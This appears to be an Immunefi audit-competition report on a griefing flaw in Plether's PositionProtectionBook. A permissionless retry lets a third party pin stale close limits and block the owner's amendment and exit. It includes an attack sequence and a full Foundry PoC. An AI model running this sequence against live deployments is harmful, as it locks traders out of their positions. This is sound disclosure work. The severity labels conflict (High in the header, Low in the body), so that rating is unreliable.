# \#98823 [SC-High] Permissionless protection retry pins obsolete close limits and repeatedly denies the owner's amendment and exit window

**Submitted on Nov 10th 2026 at 12:02:46 UTC by @midkernel for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98823
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

`PositionProtectionBook.retryPositionProtectionClose` is permissionless and resolves the protection by id, not by caller. Each retry copies the protection's stored `CloseFinancialLimits` into a fresh zero-bounty close order, sets the protection to `Triggered`, and blocks owner-authored discretionary and close order commits through the `OrderRouter__ProtectionActive` trade lock. A third party can therefore keep re-queuing a latched protection whose stored limits can no longer fund a full close, denying the trader the only latched, empty-queue state in which the limits may be amended. The demonstrated consequence is a repeatable denial of the voluntary exit and limit-repair path, recoverable by winning a single execution race.

## Vulnerability Details

Affected revision: `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Affected asset: `packages/perps/src/PositionProtectionBook.sol` with the router close-attempt path in `packages/perps/src/router/OrderLiquidationBatchLogic.sol` and `packages/perps/src/OrderRouter.sol`.

The retry entry point is open to any caller and looks the record up by id:

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    _recordCloseAttempt(protection, linkedOrderId);
}
```

`_activeProtection(protectionId)` does not check `msg.sender` or require `_ownedActiveProtection`. The queue check uses `protection.account`, so a caller can queue work against the owner's account without consent. `_recordCloseAttempt` then changes the state:

```solidity
protection.linkedOrderId = linkedOrderId;
protection.status = PositionProtectionTypes.PositionProtectionStatus.Triggered;
_attemptProtectionIds[linkedOrderId] = protection.protectionId;
```

The router builds the retried order from the stored limits, unchanged, and assigns fresh timing and a new order id:

```solidity
PositionProtectionTypes.CloseFinancialLimits memory limits =
    host.positionProtectionBook().closeFinancialLimits(protectionId);
request.bounds.submitBy = uint64(block.timestamp);
request.bounds.executionWindowSeconds = uint32(host.maxExecutionWindowSeconds());
request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
```

The default execution window is 60 seconds (`OrderExecutionOrchestrator.DEFAULT_MAX_EXECUTION_WINDOW_SECONDS`). The retry is zero bounty and takes no oracle input at commit time, so the attacker's cost is gas only.

While the protection is latched or triggered, the owner has no ordinary repair path:

- `amendLatchedPositionProtectionCloseLimits` requires `status == Latched` and `pendingOrderCounts(msg.sender) == 0`. A live retry sets `Triggered`, so amendment reverts `OrderRouter__ProtectionNotLatched`.
- `cancelPositionProtection` and `replacePositionProtection` accept only `PendingOpen` or `Armed`, and `cancelPositionProtectionAndCommitClose` accepts only `Armed`, so a latched or triggered record cannot be cancelled, replaced, or converted into an owner close.
- Every ordinary commit is blocked while `activePositionProtectionId(account) != 0` with `OrderRouter__ProtectionActive`.

The only owner repair is one atomic transaction that first terminalises the pending retry child and then amends the limits. The attacker defeats that window by committing a retry in the current block. `OrderRouterExecutionSidecar` returns `Pending` with `PendingReason.SameBlock` when `ExecutionBlockNumberLib.current() == order.commitBlock`, so the owner cannot terminalise a child that was committed in the same block:

```solidity
if (!request.oracleFrozen && ExecutionBlockNumberLib.current() == order.commitBlock) {
    return _pendingResult(order.orderId, OrderV3Types.PendingReason.SameBlock);
}
```

In the next block the attacker can execute the failing child and call `retryPositionProtectionClose` again in the same transaction. A failed attempt calls `handleFailedProtectionAttempt`, which sets `Latched` only when the position is unchanged:

```solidity
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    return true;
}
```

The queue therefore moves from one child to zero and back to one inside the attacker's transaction. The latched empty-queue state the owner needs exists only inside a transaction the attacker controls.

Prerequisites, observed in the runtime evidence: the stored limits must be unable to fund a full close. The PoC uses `maxExecutionNotionalAssets = 1`, which makes every retry fail terminally with `ConstraintViolation`. The same condition arises in production when accumulated carry, fees, or gross account debit exceed the stored `maxGrossAccountDebitAssets` or `maxActionChargeAssets` after the limits were set. The PoC also requires the first protection attempt to fail or expire so the record reaches `Latched` with an empty account queue, and it models an attacker that is ordered before the owner in each block.

Runtime evidence comes from `test/protection-retry-lockout/ProtectionRetryGrief.t.sol` at the same revision. It executes the real `PositionProtectionBook`, `OrderRouter`, `CfdEngine`, and `MarginClearinghouse` contracts in a local Foundry fixture. The fixture supplies market data through `MockPyth` and controls block numbers and timestamps with Foundry cheatcodes. The source facts above are from the cited production code. The denial and the recovery race are observed runtime results, recorded in `proof-of-concept.md`.

## Impact Details

Selected program impact: Griefing (no profit motive, but damage to users or the protocol).

The demonstrated consequence is a repeatable denial of the trader's voluntary close and limit-repair path. While the third party keeps a retry live, the trader cannot cancel the protection, replace it, submit an ordinary close, or amend the stale limits. In that state the trader's position remains locked behind the protection until she wins an execution race, is liquidated, or the third party stops.

The finding is rated Low. The program lists Griefing and temporary freezing of funds for at least 1 hour under Medium. This report does not claim those sustained thresholds. Each retry's denial is bounded by the 60 second execution window, liquidation remains permissionless, and the trader deterministically recovers when she is first to execute the child and amend in one transaction. The finding is therefore a bounded, recoverable griefing condition rather than a sustained freeze.

Material limits, stated as positive conditions:

- The stale-limit configuration is required. The stored close limits must no longer cover a full close. The PoC fixes `maxExecutionNotionalAssets = 1` for determinism. The carry-driven variant, where elapsed carry pushes gross debit or the action charge above the stored ceilings, is supported by the code path that copies the stored limits but is not separately executed.
- The owner recovery is a gas race. The owner wins deterministically if she executes the pending child first and then amends in the same transaction. The PoC observes this recovery in `test_OwnerCanOnlyRecoverIfSheWinsTheQueueWindow`.
- The attacker must win block ordering in each round. On a live sequencer this is a per-block ordering assumption, not a guaranteed position.
- If the position becomes liquidatable, liquidation remains permissionless. The position is not permanently frozen, and during the retry loop no funds are stolen and no user balance changes. Retries carry zero bounty, so the attacker gains nothing.
- A denial sustained for one hour or more is not demonstrated. Each retry denies only its 60 second window, and the PoC shows one front-run round plus one re-queue round.

## References

- Affected revision: https://github.com/immunefi-team/audit-comp-plether/commit/a82d4fefb02768e5b3bddcc97dee371eee24fea8
- `PositionProtectionBook.sol`, retry, amend, cancel, and latched transition: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L315-L406
- `PositionProtectionBook.sol`, `Triggered` transition: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L564-L577
- `PositionProtectionBook.sol`, failed-attempt relatch: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol#L637-L668
- `OrderLiquidationBatchLogic.sol`, close-attempt commit and stored-limit copy: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L186-L211
- `OrderLiquidationBatchLogic.sol`, protection trade lock: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313-L315
- `OrderLiquidationBatchLogic.sol`, retry request construction: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L657-L680
- `OrderRouterExecutionSidecar.sol`, same-block execution shield: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol#L447-L448
- `OrderExecutionOrchestrator.sol`, 60 second default execution window: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderExecutionOrchestrator.sol#L11-L14
- Plether audit competition page and impact taxonomy: https://immunefi.com/audit-competition/plether/


## Proof of Concept

## Proof of Concept

Warning: run this only in a disposable local environment. The test deploys local contract instances and uses mock oracle data. Do not point it at a production network, a live deployment, or real funds. It broadcasts no transactions and needs no private key.

### Affected and tested revision

- Affected revision: `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
- Tested revision: the same checkout, `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
- Toolchain used: Foundry `forge 1.8.3` (commit `cae51ad458f6abb64852b7709eb784352429825d`), Solc `0.8.35`.
- Root configuration: `foundry.toml` at the repository root, with `solc = "0.8.35"`, `optimizer = true`, `optimizer_runs = 200`, and `via_ir = true`.
- `FOUNDRY_VIA_IR` was not set. The run used the root `via_ir = true` setting. The first compile of the added test took 103.42 seconds and was not too slow, so the `FOUNDRY_VIA_IR=false` fallback was not needed.

### Environment, topology, and configuration

The test runs in a local Foundry EVM. The actors are:

- Trader: the owner of the protected LONG position and the protection record. The fixture represents this actor with its `ALICE` address.
- Trigger keeper: a permissionless keeper that triggers the protection. The fixture uses `TRIGGER_KEEPER`.
- Execution keeper: a permissionless keeper that executes or expires the queued close. The fixture uses `EXECUTION_KEEPER`.
- Third party: the attacker that re-queues the retried close. The fixture uses `CAROL`.

The test executes the real production contracts at the pinned revision:

- `PositionProtectionBook`, through `IPositionProtectionActions` and `IPositionProtectionViews`.
- `OrderRouter` and its close-attempt host path in `router/OrderLiquidationBatchLogic.sol`.
- `CfdEngine`, `MarginClearinghouse`, and the router lifecycle and queue books deployed by the repository fixture.

Fixture-only elements, not part of the production attack:

- `MockPyth` supplies the local price payloads. The fixture commits and executes orders with locally generated payloads instead of live Pyth data.
- Foundry cheatcodes control block numbers and timestamps, which models the per-block ordering of the third party and the trader.
- The fixture funds the trader, the second trader, and the third party with `20,000e6` local settlement tokens.

The test uses the repository harness `packages/perps/test/perps/spec/trader/PositionProtection.t.sol`, which inherits `BasePerpTest`. That harness is shipped at the pinned revision and is not modified. Its `setUp` wires the production contracts and then runs:

```solidity
protectionBook = router.positionProtectionBook();
protectionActions = IPositionProtectionActions(address(protectionBook));
protectionViews = IPositionProtectionViews(address(protectionBook));

_fundTrader(ALICE, 20_000e6);
_fundTrader(BOB, 20_000e6);
_fundTrader(CAROL, 20_000e6);

_refreshMark(MARK_PRICE);
```

Relevant fixture constants:

```solidity
uint256 internal constant MARK_PRICE = 1e8;
uint256 internal constant POSITION_SIZE = 10_000e18;
uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;
uint256 internal constant LONG_TAKE_PROFIT = 90_000_000;
```

The harness helper `_expireProtectionAttempt` warps past the attempt's execution deadline and calls `router.executeOrder(orderId, new bytes[](0))` as the cleaner. The helper `_mockUniquePythUpdateDataAt` writes a unique mock Pyth price for the requested publish times. These helpers only prepare the latched state and the execution payloads. The vulnerable calls are made to the production `PositionProtectionBook` and `OrderRouter` interfaces.

### Setup

The repository is the competition repository `immunefi-team/audit-comp-plether`. Clone access requires the access granted for the Plether audit competition.

1. Clone the repository and check out the affected revision:

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
```

2. Create the test directory:

```bash
mkdir -p test/protection-retry-lockout
```

3. Save the complete source shown under "Complete test source" as `test/protection-retry-lockout/ProtectionRetryGrief.t.sol`. No edit to the source is required after saving.

4. Run the test from the repository root:

```bash
forge test --match-path 'test/protection-retry-lockout/ProtectionRetryGrief.t.sol' -vv
```

The documented invocation also runs the inherited `PositionProtectionTest` suite, so it reports 108 tests. The four tests added by this source are the ones named in the output below. To run only those four:

```bash
forge test --match-path 'test/protection-retry-lockout/ProtectionRetryGrief.t.sol' --match-test 'test_LatchedOwnerHasNoExitBesidesPermissionlessRetry|test_ThirdPartyRetryPinsLimitsAndBlocksAmendmentWhilePending|test_FrontRunRetryDeniesTheOwnersOnlyAtomicRecoveryWindow|test_OwnerCanOnlyRecoverIfSheWinsTheQueueWindow' -vv
```

### Positive control

The positive control is the fourth test, `test_OwnerCanOnlyRecoverIfSheWinsTheQueueWindow`, run in the same fixture, from the same latched state and the same stored limits as the attack tests.

In the control, the third party queues the retry first. The trader then wins the ordering: in the next block the trader executes the pending child and then calls `amendLatchedPositionProtectionCloseLimits` with widened limits in the same block, which models one atomic recovery transaction. The child terminalises, the Book relatches, the account queue returns to zero, and the amendment succeeds. The test asserts:

```solidity
assertEq(router.pendingOrderCounts(ALICE), 0, "no live child after owner-led terminalization");
assertEq(
    uint8(protectionViews.getPositionProtection(protectionId).status),
    uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
    "protection stays latched for the amended retry"
);
```

Observed result: PASS. This control proves the amendment path works in this fixture and that the denial in the attack tests depends on the third party controlling the execution ordering, not on a broken amend path. The full suite run also reports PASS for `test_ProtectionCloseLimits_OnlyOwnerCanAmendLatchedLimitsForNextRetry`, an independent control for the normal latched amendment path.

### Production attack sequence

1. Trader holds an open LONG position and arms a single-leg take-profit protection through `createPositionProtection`. The stored `CloseFinancialLimits` cannot cover a full close. In the PoC this is `maxExecutionNotionalAssets = 1`; in production the same condition is reached when accumulated carry, fees, or gross account debit exceed the stored `maxGrossAccountDebitAssets` or `maxActionChargeAssets`.
2. Trigger keeper calls `triggerPositionProtection` through the real Book interface. The protection status becomes `Triggered`, and the router queues the first zero-bounty close child for the trader's account.
3. Execution keeper's first child fails or expires. The router calls `handleFailedProtectionAttempt`; the position is unchanged, so the Book sets the protection to `Latched`, deletes the attempt id, and leaves the trader's account queue empty. `activePositionProtectionId` remains set, so the protection trade lock remains active.
4. Third party calls `retryPositionProtectionClose(protectionId)` through the real Book interface. The Book resolves the record by id without checking the caller, copies the stored obsolete limits into a fresh zero-bounty close with a 60 second window, and sets the status to `Triggered`.
5. Trader submits the only available recovery: `executeOrder` on the pending child followed by `amendLatchedPositionProtectionCloseLimits`, in one transaction. Because the third party committed the retry in the current block, `executeOrder` returns `Pending` under the same-block execution shield. The amendment then reverts `OrderRouter__ProtectionNotLatched`, and the recovery transaction has no effect.
6. In the next block the third party calls `executeOrder` on the same child. Policy evaluation fails terminally with `ConstraintViolation` because the execution notional exceeds the stored ceiling. The Book relatches. In the same transaction the third party calls `retryPositionProtectionClose` again, so the account queue goes from one child to zero and back to one. The trader never observes the latched empty-queue state outside a transaction the third party controls.
7. Third party repeats step 6 once per execution window, at gas cost only. Each retry is zero bounty and needs no oracle update. The trader cannot cancel, replace, or submit an ordinary close while the protection is active. Liquidation remains permissionless.

### Expected and observed results

Expected results from the production code path:

- A latched protection leaves the trader with no cancel, replace, ordinary close, or atomic cancel-and-close path. Each call reverts with `OrderRouter__ProtectionNotArmed` or `OrderRouter__ProtectionActive`.
- A third-party retry queues one close for the trader, sets `Triggered`, and copies the stored ceiling unchanged. The trader's amendment reverts `OrderRouter__ProtectionNotLatched`.
- A retry committed in the current block cannot be terminalised in that block. `executeOrder` returns `Pending`, so the trader's atomic recovery fails.
- In the next block the child fails with `ConstraintViolation`, relatches, and can be replaced by a fresh retry in the same transaction.

Observed results:

- `test_LatchedOwnerHasNoExitBesidesPermissionlessRetry`: PASS. All four owner paths revert as expected.
- `test_ThirdPartyRetryPinsLimitsAndBlocksAmendmentWhilePending`: PASS. The retry queues one child for the trader, the status is `Triggered`, the pending policy still has `maxExecutionNotionalAssets == 1`, and the amendment reverts.
- `test_FrontRunRetryDeniesTheOwnersOnlyAtomicRecoveryWindow`: PASS. The same-block execution returns `Pending`; the amendment reverts; the next-block execution returns `Failed` with terminal reason `ConstraintViolation`; the attacker re-queues in the same transaction and the amendment reverts again.
- `test_OwnerCanOnlyRecoverIfSheWinsTheQueueWindow`: PASS. The trader recovers only when she executes the child first and amends in the same transaction.
- The same run: 108 tests passed, 0 failed.

### Observed command output

Command:

```bash
forge test --match-path 'test/protection-retry-lockout/ProtectionRetryGrief.t.sol' -vv
```

Observed output, with the repeated compiler warnings and the unrelated inherited PASS lines omitted:

```text
Compiling 1 files with Solc 0.8.35
Solc 0.8.35 finished in 103.42s
Compiler run successful with warnings:
Warning (6335): "error" will be promoted to keyword in the future and will not be allowed as an identifier anymore.
...
[PASS] test_FrontRunRetryDeniesTheOwnersOnlyAtomicRecoveryWindow() (gas: 6494677)
[PASS] test_LatchedOwnerHasNoExitBesidesPermissionlessRetry() (gas: 3865870)
[PASS] test_OwnerCanOnlyRecoverIfSheWinsTheQueueWindow() (gas: 5455772)
[PASS] test_ThirdPartyRetryPinsLimitsAndBlocksAmendmentWhilePending() (gas: 4428211)
...
Suite result: ok. 108 passed; 0 failed; 0 skipped; finished in 710.44ms (2.48s CPU time)

Ran 1 test suite in 712.65ms (710.44ms CPU time): 108 tests passed, 0 failed, 0 skipped (108 total tests)
```

Command for only the four tests:

```bash
forge test --match-path 'test/protection-retry-lockout/ProtectionRetryGrief.t.sol' --match-test 'test_LatchedOwnerHasNoExitBesidesPermissionlessRetry|test_ThirdPartyRetryPinsLimitsAndBlocksAmendmentWhilePending|test_FrontRunRetryDeniesTheOwnersOnlyAtomicRecoveryWindow|test_OwnerCanOnlyRecoverIfSheWinsTheQueueWindow' -vv
```

Observed output:

```text
No files changed, compilation skipped

Ran 4 tests for test/protection-retry-lockout/ProtectionRetryGrief.t.sol:ProtectionRetryGriefTest
[PASS] test_FrontRunRetryDeniesTheOwnersOnlyAtomicRecoveryWindow() (gas: 6494677)
[PASS] test_LatchedOwnerHasNoExitBesidesPermissionlessRetry() (gas: 3865870)
[PASS] test_OwnerCanOnlyRecoverIfSheWinsTheQueueWindow() (gas: 5455772)
[PASS] test_ThirdPartyRetryPinsLimitsAndBlocksAmendmentWhilePending() (gas: 4428211)
Suite result: ok. 4 passed; 0 failed; 0 skipped; finished in 26.69ms (15.97ms CPU time)

Ran 1 test suite in 27.97ms (26.69ms CPU time): 4 tests passed, 0 failed, 0 skipped (4 total tests)
```

### Cleanup

- The test broadcasts nothing, creates no accounts, and moves no real funds. There is no on-chain state to recover.
- Remove the local checkout, for example by deleting the cloned repository directory.
- If the checkout is reused, delete `test/protection-retry-lockout` and the generated `cache` and `out` directories, or run `forge clean` from the repository root.

### Demonstrated scope and material limits

- The denial is observed against the production `PositionProtectionBook` and `OrderRouter` contracts at revision `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Only the oracle feed is mocked and only block and timestamp values are controlled by the fixture.
- The stale-limit configuration is required. The stored limits must not cover a full close. The PoC fixes `maxExecutionNotionalAssets = 1` so the failure is deterministic. The carry-driven variant, where elapsed carry pushes the action charge or gross debit above the stored ceilings, is supported by the code path that copies the stored limits into every retry, but that variant is not separately executed here.
- Owner recovery is a gas race. The owner can terminalise the child and amend in one transaction and succeeds when she is first. The positive control observes this recovery. The attack test models the atomic recovery with consecutive same-block calls by the trader; because the amendment reverts, a live atomic transaction would revert in full and leave no recovery. The third party must win block ordering in each round, which is a per-block assumption on a live sequencer.
- If the position becomes liquidatable, liquidation remains permissionless. The position is not permanently frozen, and during the retry loop no funds are stolen or moved and no user balance changes. Retries are zero bounty, so the third party gains no profit.
- A denial sustained for one hour or more is not demonstrated. Each retry denies only its 60 second execution window. The PoC shows one front-run round and one re-queue round.
- The reproduction is a local Foundry fixture that inherits the repository `PositionProtectionTest` harness. It is not a live Arbitrum deployment and does not rely on any unpublished step or external service.

### Complete test source

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {PositionProtectionTest} from "../../packages/perps/test/perps/spec/trader/PositionProtection.t.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";

/// @notice PoC: a permissionless retry pins obsolete close limits on a latched
/// position protection and deny the owner the only empty-queue window in which limits may be amended.
contract ProtectionRetryGriefTest is PositionProtectionTest {

    function _latchedProtectionWithImpossibleLimits() internal returns (uint64 protectionId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);

        PositionProtectionTypes.PositionProtectionParams memory params = _params(LONG_TAKE_PROFIT, 0);
        // A full protective close can never fit an execution notional of one settlement atom.
        params.closeLimits.maxExecutionNotionalAssets = 1;

        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);

        uint64 firstAttempt = _triggerAt(protectionId, LONG_TAKE_PROFIT);
        _expireProtectionAttempt(firstAttempt, EXECUTION_KEEPER);

        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "expired first attempt must latch"
        );
        assertEq(protectionViews.activePositionProtectionId(ALICE), protectionId, "latch keeps the trade lock");
        assertEq(router.pendingOrderCounts(ALICE), 0, "latch leaves an empty account queue");
    }

    function _amendedLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits.maxExecutionNotionalAssets = type(uint256).max;
        limits.maxGrossAccountDebitAssets = type(uint256).max;
        limits.maxActionChargeAssets = type(uint256).max;
        limits.maxExplicitFeesAssets = type(uint256).max;
    }

    function test_LatchedOwnerHasNoExitBesidesPermissionlessRetry() public {
        uint64 protectionId = _latchedProtectionWithImpossibleLimits();

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.replacePositionProtection(protectionId, _params(LONG_TAKE_PROFIT, 0));

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);

        OrderV3Types.OrderRequest memory manualClose = _manualCloseRequest(CfdTypes.Side.LONG);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtectionAndCommitClose(protectionId, manualClose);
    }

    function test_ThirdPartyRetryPinsLimitsAndBlocksAmendmentWhilePending() public {
        uint64 protectionId = _latchedProtectionWithImpossibleLimits();

        vm.prank(CAROL);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);

        assertEq(router.pendingOrderCounts(ALICE), 1, "third-party retry queues one close for the owner");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
            "fresh retry owns the live child"
        );

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _amendedLimits());

        // The queued retry still carries the obsolete ceilings.
        assertEq(
            router.lifecycleBook().pendingPolicy(retryId).maxExecutionNotionalAssets,
            1,
            "retry reuses the stored (obsolete) ceiling"
        );
    }

    function test_FrontRunRetryDeniesTheOwnersOnlyAtomicRecoveryWindow() public {
        uint64 protectionId = _latchedProtectionWithImpossibleLimits();

        // Attacker is first in the block and queues a retry.
        vm.prank(CAROL);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);

        // Owner submits the only recovery available to her: terminalize the pending retry and amend
        // the limits in one transaction. Because the retry was committed in this same block, the
        // execution cannot settle (oracle needs publishTime > commitTime and the item is same-block)
        // and the amend still sees a pending order.
        uint64 commitSecond = uint64(vm.getBlockTimestamp());
        bytes[] memory sameBlockData =
            _mockUniquePythUpdateDataAt(LONG_TAKE_PROFIT, commitSecond, commitSecond - 1);
        vm.prank(ALICE);
        OrderV3Types.ExecutionResult memory pendingResult = router.executeOrder(retryId, sameBlockData);
        assertEq(
            uint8(pendingResult.status),
            uint8(OrderV3Types.LifecycleStatus.Pending),
            "same-block retry cannot be terminalized"
        );

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _amendedLimits());

        // Next block: even a failing execution lets the attacker re-queue atomically, so the
        // owner's empty-queue window exists only inside a transaction the attacker controls.
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint64 nextSecond = uint64(vm.getBlockTimestamp());
        bytes[] memory nextBlockData =
            _mockUniquePythUpdateDataAt(LONG_TAKE_PROFIT, nextSecond, nextSecond - 1);
        vm.prank(CAROL);
        OrderV3Types.ExecutionResult memory failedResult = router.executeOrder(retryId, nextBlockData);
        assertEq(uint8(failedResult.status), uint8(OrderV3Types.LifecycleStatus.Failed), "obsolete ceiling fails");
        assertEq(
            uint8(failedResult.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "execution-notional ceiling is a terminal policy failure"
        );

        vm.prank(CAROL);
        uint64 retry2 = protectionActions.retryPositionProtectionClose(protectionId);
        assertEq(router.pendingOrderCounts(ALICE), 1, "attacker re-queues in the same transaction");
        assertGt(retry2, retryId, "fresh order id");

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _amendedLimits());
    }

    function test_OwnerCanOnlyRecoverIfSheWinsTheQueueWindow() public {
        uint64 protectionId = _latchedProtectionWithImpossibleLimits();

        vm.prank(CAROL);
        uint64 retryId = protectionActions.retryPositionProtectionClose(protectionId);

        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint64 nextSecond = uint64(vm.getBlockTimestamp());
        bytes[] memory data =
            _mockUniquePythUpdateDataAt(LONG_TAKE_PROFIT, nextSecond, nextSecond - 1);

        vm.startPrank(ALICE);
        router.executeOrder(retryId, data);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _amendedLimits());
        vm.stopPrank();

        assertEq(router.pendingOrderCounts(ALICE), 0, "no live child after owner-led terminalization");
        assertEq(
            uint8(protectionViews.getPositionProtection(protectionId).status),
            uint8(PositionProtectionTypes.PositionProtectionStatus.Latched),
            "protection stays latched for the amended retry"
        );
    }
}
```

